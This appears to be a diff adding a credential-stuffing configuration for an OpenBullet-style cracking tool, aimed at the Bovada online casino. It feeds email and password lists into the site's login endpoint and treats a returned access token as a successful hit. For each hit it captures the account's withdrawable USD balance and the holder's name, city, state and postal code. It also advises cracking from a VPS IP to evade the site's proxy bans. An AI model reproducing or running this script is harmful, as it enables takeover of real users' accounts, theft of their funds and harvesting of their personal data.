@@ -1,0 +1,59 @@
+[SETTINGS]
+{
+  "Name": "Bovada",
+  "SuggestedBots": 50,
+  "LastModified": "2018-05-28T22:14:50.0694162+00:00",
+  "AdditionalInfo": "Bovada bans proxies and VPNs so use your VPS IP to crack",
+  "Author": "Ruri",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_MAIN_PAGE REQUEST GET "https://casino.bovada.lv/?overlay=login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#POST_LOGIN REQUEST POST "https://casino.bovada.lv/services/web/v2/oauth/token" AutoRedirect=TRUE 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: https://casino.bovada.lv" 
+  HEADER "referer: https://casino.bovada.lv/?overlay=login" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+  KEYCHAIN Failure OR 
+    KEY "error_description" 
+#PARSE_ID PARSE "<HEADERS(X-Profile-Id)>" LR "" "" Recursive=FALSE -> VAR "ID" "" "" 
+#PARSE_TOKEN PARSE "<SOURCE>" JSON "access_token" Recursive=FALSE -> VAR "TOKEN" "" "" 
+REQUEST GET "https://casino.bovada.lv/services/web/v2/profiles/<ID>/summary" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Authorization: bearer <TOKEN>" 
+#CAPTURE_BALANCE PARSE "<SOURCE>" LR "\",\"wallets\":{\"cash\":{\"currencyCode\":\"USD\",\"withdrawableBalance\":{\"amount\":" "}" Recursive=FALSE -> CAP "Withdrawable" "" "" 
+#CAPTURE_CITY PARSE "<SOURCE>" LR "\",\"city\":\"" "\"" Recursive=FALSE -> CAP "City" "" "" 
+#CAPTURE_STATE PARSE "<SOURCE>" LR "state\":\"" "\"" Recursive=FALSE -> CAP "State" "" "" 
+#CAPTURE_ZIP PARSE "<SOURCE>" LR "postalCode\":\"" "\"" Recursive=FALSE -> CAP "" "" "" 
+PARSE "<SOURCE>" LR "firstName\":\"" "\"" Recursive=FALSE -> CAP "" "" "" 
+PARSE "<SOURCE>" LR "lastName\":\"" "\"" Recursive=FALSE -> CAP "" "" "" 
